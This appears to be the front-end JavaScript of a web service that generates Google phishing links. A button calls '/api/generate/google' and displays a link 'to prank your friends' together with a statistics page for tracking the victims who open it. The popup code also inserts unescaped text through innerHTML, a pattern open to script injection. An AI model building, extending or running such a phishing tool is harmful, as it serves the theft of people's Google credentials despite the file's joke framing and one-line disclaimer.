// Css tweaks
function tweakCssPopup() {

    const closePopupButton = document.getElementById('close-popup');
    const popup = document.querySelector('.popup');


    closePopupButton.addEventListener('mouseover', e => {
        popup.classList.add('angry');
    })
    closePopupButton.addEventListener('mouseleave', e => {
        popup.classList.remove('angry');
    })
    closePopupButton.addEventListener('click', e => {
        window.location.reload();
    })
}
// Popup and message displaying fuctionality

function displayPopup(message) {
    const popupContainer = document.getElementById('popup-container');

    popupContainer.innerHTML += `<div class="dull-out"></div>
    
    <div class="popup">
        <span class="popup-text">${message}</span>
        <img src="https://flaticons.net/icon.php?slug_category=mobile-application&slug_icon=close" id="close-popup">
    </div>`
}

function removePopup() {
    const popupContainer = document.getElementById('popup-container');

    popupContainer.innerHTML = ``;
}

// Backend Response Handler
const googleB = document.getElementById('google-phish-generate-button');
googleB.addEventListener('click', e => {
    fetch('/api/generate/google').then(res => res.json()).then(res => {
        if(!res.success) {
            console.log("Error with the server, success is not true...")
            return;
        }
        const statsID = res.linkData.statsID;
        const phishLink = res.linkData.phishLink;

        displayPopup(`Your Link has been successfully generated by our backend system... This is the link to prank your friends: "${phishLink}" To view statistics on the link go to: /google/stats?statsID=${statsID}.. Harmful use of this took will not be tolerated!!`)
        tweakCssPopup();
    })
})


//Coming Soon Function

function cs() {
    window.alert('This feature will be added at the start of March.... Please be patient and enjoy poha with curd until then :)');
}
